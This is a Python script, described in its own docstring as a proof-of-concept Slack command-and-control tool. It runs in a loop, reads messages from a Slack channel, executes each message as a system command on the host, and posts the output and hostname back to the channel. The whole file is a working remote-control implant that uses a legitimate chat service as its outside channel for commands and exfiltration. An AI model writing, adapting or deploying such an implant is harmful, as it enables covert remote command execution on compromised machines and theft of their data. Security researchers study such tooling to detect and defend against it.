import sys
import time
import json
import subprocess
import configparser
from slackclient import SlackClient

'''
Very basic PoC of slack as c2. I will work on this more over the weekend.

Usage:

python3 get_slacked.py /path/to/config.ini

Config.ini contents:

[Slack]
token=YOUR_TOKEN_GOES_HERE_WITHOUT_QUOTES
channel_id=YOUR_CHANNEL_ID_WITHOUT_QUOTES
username=testing
'''



'''
Get values from config file: slack_token, slack_channel, test_username
'''
def get_config_info():

    # get the path to the config file from the first parameter
    config_file_path = ''

    if len(sys.argv) > 1:
        config_file_path = sys.argv[1]
    else:
        print('Usage: %s /path/to/config.ini' % (sys.argv[0],))
        sys.exit()

    config = configparser.ConfigParser()

    # parse the content of the config file
    with open(config_file_path, 'r') as f:
        config.read_file(f)

    slack_token = config['Slack']['token']
    slack_channel = config['Slack']['channel_id']
    test_username = config['Slack']['username']

    return slack_token, slack_channel, test_username


'''
Function takes in json and then executes the at key location: text
Returns output
'''
def execute_command(data):
    output = subprocess.run(data['text'].split(), stdout=subprocess.PIPE)
    print(output.stdout)
    return output.stdout

'''
Send results
'''
def send_results(machine_name, sc, slack_channel, data):
    sc.api_call("chat.postMessage",
             channel=slack_channel,
             text='*' + ((machine_name.stdout).decode('UTF-8')).rstrip() + '*\n' + data.decode('UTF-8')
)

'''
Pull down latest messages from slack channel.
'''
def pull_commands(sc):
    raw_commands = sc.rtm_read() # Retuns a dictionary in a list.

    if len(raw_commands) > 0:
        # To remove the dictionary from the list
        str_raw_commands = raw_commands[0]

        if len(str_raw_commands) > 3:

            # Fix Json
            j = json.loads(str(str_raw_commands).replace("'",'"'))


            return j
    return None

'''
Check to see if the messages pulled down were not from the bots user.
This is so that the python code does not execute its own output.
'''
def send_me_maybe(j, test_username):
    try:
        if j['username'] != test_username:
            # Will fail to find when message not from bot. When from bot, will not execute anyways...

            # data = subprocess.run([j['text']], shell=True, stdout=subprocess.PIPE)

            return False
    except:
        return True


def main():
    machine_name = subprocess.run(['hostname'], stdout=subprocess.PIPE)
    print(machine_name.stdout)
    slack_token, slack_channel, test_username = get_config_info()

    # Create SlackClient object named sc.
    sc = SlackClient(slack_token)

    # Basic connection vs rtm.start()
    print(sc.rtm_connect())

    while True:
        # Pull commands from slack channel
        downloaded_data = pull_commands(sc)

        # If the downloaded data was of proper format and not the bots output
        if downloaded_data != None and send_me_maybe(downloaded_data, test_username):
            send_results(machine_name, sc, slack_channel, execute_command(downloaded_data))

        time.sleep(.05)



if __name__ == '__main__':
    main()
